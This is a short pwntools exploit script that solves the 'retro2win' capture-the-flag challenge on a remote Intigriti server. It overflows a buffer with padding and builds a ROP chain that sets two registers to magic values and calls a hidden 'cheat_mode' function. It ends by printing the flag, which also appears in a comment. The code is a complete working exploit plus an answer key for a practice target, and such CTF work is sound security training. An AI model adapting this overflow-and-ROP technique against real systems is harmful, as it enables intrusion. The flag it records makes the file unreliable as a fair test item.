#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./retro2win", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("retro2win.ctf.intigriti.io", 1338)

p.sendlineafter(b"option:\r\n", str(0x539).encode())

rop = ROP(elf)
rop.raw(b"A" * 0x18)
rop.rdi = 0x2323232323232323
rop.rsi = 0x4242424242424242
rop.call("cheat_mode")

p.sendlineafter(b"Enter your cheatcode:\r\n", rop.chain())

p.readuntil(b"FLAG: ")

print(p.readline()[:-2].decode()) # INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}
